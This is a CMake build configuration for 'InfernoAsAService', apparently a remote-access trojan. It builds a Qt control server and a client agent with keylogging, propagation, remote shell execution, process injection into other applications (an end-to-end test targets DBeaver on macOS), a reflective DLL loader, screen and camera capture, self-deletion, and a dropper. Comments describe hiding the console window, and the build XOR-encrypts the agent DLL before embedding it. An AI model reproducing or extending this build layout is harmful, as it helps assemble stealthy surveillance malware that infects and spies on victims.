cmake_minimum_required(VERSION 3.15)
project(InfernoAsAService VERSION 1.0.0 LANGUAGES CXX)

# ==========================================
# 1. Global Compiler Configurations
# ==========================================
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
if(MSVC)
    add_compile_options(/W4 /WX)
    add_compile_definitions(NOMINMAX)
else()
    add_compile_options(-Wall -Wextra -Wpedantic -Werror)
endif()

# ==========================================
# 2. OpenSSL (Circle 8 — Transport Security)
# ==========================================
find_package(OpenSSL REQUIRED)

# ==========================================
# 3. Qt Dependencies (Circle 4)
# ==========================================
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)
set(CMAKE_AUTOUIC ON)

find_package(Qt6 REQUIRED COMPONENTS Core Widgets Gui Sql)

# ==========================================
# 2. Common Library (Networking & Protocol)
# ==========================================
add_library(inferno_common STATIC
    common/src/Socket.cpp
    common/src/Packet.cpp
    common/src/CryptoContext.cpp
)
target_include_directories(inferno_common PUBLIC common/include)
target_link_libraries(inferno_common PUBLIC OpenSSL::Crypto)

# ==========================================
# 3. Server Executable
# ==========================================
add_executable(inferno_server
    server/src/main.cpp
    server/src/network/server.cpp
    server/src/ui/MainWindow.cpp
    server/src/ui/components/AgentCardDialog.cpp
    server/src/ui/components/CommandDialog.cpp
    server/src/ui/components/DataStreamWidget.cpp
    server/src/ui/components/TelemetryPanel.cpp
    server/src/ui/components/KeylogPanel.cpp
    server/src/ui/components/IntelligencePanel.cpp
    server/src/ui/components/InjectionPanel.cpp
    server/src/ui/components/PropagationPanel.cpp
    server/src/ui/components/MediaPanel.cpp
    server/src/database/Inferno_Database.cpp
    server/src/services/Analysis.cpp
    server/src/services/IntelAnalysisService.cpp
    server/include/network/server.hpp
    server/include/ui/MainWindow.hpp
    server/include/ui/StyleSheets.hpp
    server/include/ui/components/DataStreamWidget.hpp
    server/include/ui/components/CommandDialog.hpp
    server/include/ui/components/AgentCardDialog.hpp
    server/include/ui/components/TelemetryPanel.hpp
    server/include/ui/components/KeylogPanel.hpp
    server/include/ui/components/IntelligencePanel.hpp
    server/include/ui/components/InjectionPanel.hpp
    server/include/ui/components/PropagationPanel.hpp
    server/include/ui/components/MediaPanel.hpp
    server/include/database/Inferno_Database.hpp
    server/include/services/Analysis.hpp
    server/include/services/IntelAnalysisService.hpp
    server/resources/styles.qrc
)
target_link_libraries(inferno_server PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
if(WIN32)
    target_link_libraries(inferno_server PRIVATE ws2_32)
endif()

# ==========================================
# 4. Client Agent Executable 
# ==========================================
add_executable(inferno_client
    client/src/main.cpp
    client/src/Agent.cpp
    client/src/ProcessProfiler.cpp
    client/src/ShellExecutor.cpp
    client/src/KeyLogger.cpp
    client/src/Propagator.cpp
    client/src/entry_dylib.cpp
    client/src/EntitlementScanner.cpp
)
if(WIN32)
    target_sources(inferno_client PRIVATE
        client/src/WindowsInjector.cpp
        client/src/NtApi.cpp
        client/src/ReflectiveLoader.cpp
        client/src/ScreenCapture.cpp
        client/src/CameraCapture.cpp
    )
else()
    target_sources(inferno_client PRIVATE
        client/src/MachInjector.cpp
        client/src/ScreenCapture.cpp
    )
    if(APPLE)
        target_sources(inferno_client PRIVATE
            client/src/ScreenCapture.mm
        )
    endif()
endif()
target_link_libraries(inferno_client PRIVATE inferno_common)

if(APPLE)
    find_library(CORE_GRAPHICS CoreGraphics)
    find_library(CARBON Carbon)
    find_library(IO_KIT IOKit)
    find_library(CORE_FOUNDATION CoreFoundation)
    find_library(APP_KIT AppKit)
    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION} ${APP_KIT})
endif()

if(WIN32)
    target_compile_definitions(inferno_client PRIVATE _CRT_SECURE_NO_WARNINGS)
    target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32 gdiplus mf mfplat mfreadwrite mfuuid)
    # Note: WIN32_EXECUTABLE is intentionally NOT set — the agent uses
    # FreeConsole() at runtime to hide the console window, keeping
    # standard main() as the entry point for cross-platform compatibility.
endif()

# ==========================================
# 5. Agent Dylib (Phase 4A — macOS Injection)
# ==========================================
if(APPLE)
    add_library(inferno_agent_dylib SHARED
        client/src/entry_dylib.cpp
        client/src/Agent.cpp
        client/src/ProcessProfiler.cpp
        client/src/ShellExecutor.cpp
        client/src/KeyLogger.cpp
        client/src/Propagator.cpp
        client/src/EntitlementScanner.cpp
        client/src/MachInjector.cpp
        client/src/ScreenCapture.mm
    )
    target_include_directories(inferno_agent_dylib PRIVATE client/include)
    target_compile_definitions(inferno_agent_dylib PRIVATE INFERNO_DYLIB)
    target_link_libraries(inferno_agent_dylib PRIVATE inferno_common)
    find_library(APP_KIT AppKit)
    target_link_libraries(inferno_agent_dylib PRIVATE
        ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION} ${APP_KIT}
    )
    set_target_properties(inferno_agent_dylib PROPERTIES
        OUTPUT_NAME "inferno_agent"
    )

    add_executable(inferno_shim client/src/shim.cpp)
    target_link_libraries(inferno_shim PRIVATE ${CMAKE_DL_LIBS})

    # macOS E2E injection test (requires DBeaver.app in /Applications)
    add_executable(inferno_inject_e2e_macos_test
        tests/inject_e2e_macos_test.cpp
        client/src/MachInjector.cpp
    )
    target_include_directories(inferno_inject_e2e_macos_test PRIVATE
        client/include
    )
    target_link_libraries(inferno_inject_e2e_macos_test PRIVATE
        inferno_common
        ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION}
    )
    target_compile_definitions(inferno_inject_e2e_macos_test PRIVATE
        TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
    )
    add_test(NAME InjectE2EmacOS COMMAND inferno_inject_e2e_macos_test)

    # macOS Screenshot Capture Test (Objective-C++)
    add_executable(inferno_macos_capture_test
        tests/macos_capture_test.mm
    )
    target_include_directories(inferno_macos_capture_test PRIVATE
        client/include
    )
    target_link_libraries(inferno_macos_capture_test PRIVATE
        ${CORE_GRAPHICS} ${CORE_FOUNDATION} ${APP_KIT}
    )
    add_test(NAME MacOSCapture COMMAND inferno_macos_capture_test)
endif()

# ==========================================
# 5b. Agent DLL (Phase 4B — Windows Injection)
# ==========================================
if(WIN32)
    add_library(inferno_agent_dll SHARED
        client/src/entry_dll.cpp
        client/src/Agent.cpp
        client/src/ProcessProfiler.cpp
        client/src/ShellExecutor.cpp
        client/src/KeyLogger.cpp
        client/src/Propagator.cpp
        client/src/EntitlementScanner.cpp
        client/src/WindowsInjector.cpp
        client/src/NtApi.cpp
        client/src/ReflectiveLoader.cpp
        client/src/ScreenCapture.cpp
        client/src/CameraCapture.cpp
    )
    target_include_directories(inferno_agent_dll PRIVATE client/include)
    target_compile_definitions(inferno_agent_dll PRIVATE INFERNO_DLL)
    target_compile_definitions(inferno_agent_dll PRIVATE _CRT_SECURE_NO_WARNINGS)
    target_link_libraries(inferno_agent_dll PRIVATE inferno_common ws2_32 gdiplus mf mfplat mfreadwrite mfuuid)
    set_target_properties(inferno_agent_dll PROPERTIES
        OUTPUT_NAME "inferno_agent"
    )
    add_executable(inferno_loader client/src/windows_loader.cpp)
    target_compile_definitions(inferno_loader PRIVATE _CRT_SECURE_NO_WARNINGS)

    # ── Embed XOR-encrypted DLL into the agent binary ─────────────────────
    find_package(Python3 QUIET)
    if(Python3_FOUND)
        set(DLL_EMBEDDED_HEADER "${CMAKE_CURRENT_BINARY_DIR}/inferno_agent_dll_embedded.h")
        set(INFERNO_DLL_XOR_KEY "2B7E151628AED2A6")

        add_custom_command(
            OUTPUT  ${DLL_EMBEDDED_HEADER}
            COMMAND ${Python3_EXECUTABLE}
                    "${CMAKE_CURRENT_SOURCE_DIR}/client/dll2header.py"
                    "--key" "${INFERNO_DLL_XOR_KEY}"
                    "$<TARGET_FILE:inferno_agent_dll>"
                    "${DLL_EMBEDDED_HEADER}"
            DEPENDS inferno_agent_dll
                    "${CMAKE_CURRENT_SOURCE_DIR}/client/dll2header.py"
            COMMENT "Generating inferno_agent_dll_embedded.h (XOR-encrypted)"
            VERBATIM
        )

        add_custom_target(inferno_agent_dll_embedded_target
            DEPENDS ${DLL_EMBEDDED_HEADER})
        add_dependencies(inferno_client inferno_agent_dll_embedded_target)
        target_include_directories(inferno_client PRIVATE ${CMAKE_CURRENT_BINARY_DIR})
        target_compile_definitions(inferno_client PRIVATE INFERNO_HAS_EMBEDDED_DLL)
    else()
        message(WARNING "Python3 not found — inferno_client will read DLL from disk")
    endif()
endif()

# ==========================================
# 6. TDD Infrastructure
# ==========================================
enable_testing()
add_executable(inferno_tests
    tests/main_test.cpp
    tests/socket_test.cpp
    tests/server_test.cpp
    tests/packet_test.cpp
    tests/shell_test.cpp
    tests/keylogger_test.cpp
    tests/database_test.cpp
    tests/analysis_test.cpp
    tests/process_profiler_test.cpp
    tests/scanner_test.cpp
    server/src/network/server.cpp
    server/src/database/Inferno_Database.cpp
    server/src/services/Analysis.cpp
    server/include/database/Inferno_Database.hpp
    server/include/network/server.hpp
    server/include/services/Analysis.hpp
    client/src/ProcessProfiler.cpp
    client/src/ShellExecutor.cpp
    client/src/KeyLogger.cpp
    client/src/Propagator.cpp
    client/src/Agent.cpp
    client/src/EntitlementScanner.cpp
    tests/inject_e2e_test.cpp
    tests/self_delete_test.cpp
    tests/tcc_packet_test.cpp
)
if(WIN32)
    target_sources(inferno_tests PRIVATE
        client/src/WindowsInjector.cpp
        client/src/NtApi.cpp
        client/src/entry_dll.cpp
        client/src/ReflectiveLoader.cpp
        client/src/ScreenCapture.cpp
        client/src/CameraCapture.cpp
        tests/reflective_loader_test.cpp
        tests/windows_dll_test.cpp
        tests/wire_reflective_test.cpp
        tests/embedded_dll_test.cpp
        tests/screencapture_test.cpp
        tests/cameracapture_test.cpp
    )
else()
    target_sources(inferno_tests PRIVATE
        client/src/MachInjector.cpp
        client/src/entry_dylib.cpp
        client/src/ScreenCapture.cpp
    )
    if(APPLE)
        target_sources(inferno_tests PRIVATE
            client/src/ScreenCapture.mm
        )
    endif()
endif()
target_include_directories(inferno_tests PRIVATE client/include)
target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)

if(APPLE)
    find_library(APP_KIT AppKit)
    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION} ${APP_KIT})
    target_sources(inferno_tests PRIVATE
        tests/injector_test.cpp
    )
    target_compile_definitions(inferno_tests PRIVATE
        TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
    )
endif()

if(WIN32)
    target_compile_definitions(inferno_tests PRIVATE _CRT_SECURE_NO_WARNINGS)
    target_compile_definitions(inferno_tests PRIVATE
        TEST_BINARY_DIR="$<TARGET_FILE_DIR:inferno_agent_dll>"
    )
    target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32 gdiplus mf mfplat mfreadwrite mfuuid)
    target_sources(inferno_tests PRIVATE
        tests/windows_dll_test.cpp
    )
    add_dependencies(inferno_tests inferno_agent_dll inferno_loader)
    if(Python3_FOUND)
        target_compile_definitions(inferno_tests PRIVATE INFERNO_HAS_EMBEDDED_DLL)
        target_include_directories(inferno_tests PRIVATE ${CMAKE_CURRENT_BINARY_DIR})
        add_dependencies(inferno_tests inferno_agent_dll_embedded_target)
    endif()
endif()

add_test(NAME CoreNetworkingTests COMMAND inferno_tests)

# ==========================================
# 7. Agent Wrapper / Dropper (Phase 2.3)
# ==========================================
add_subdirectory(wrapper)
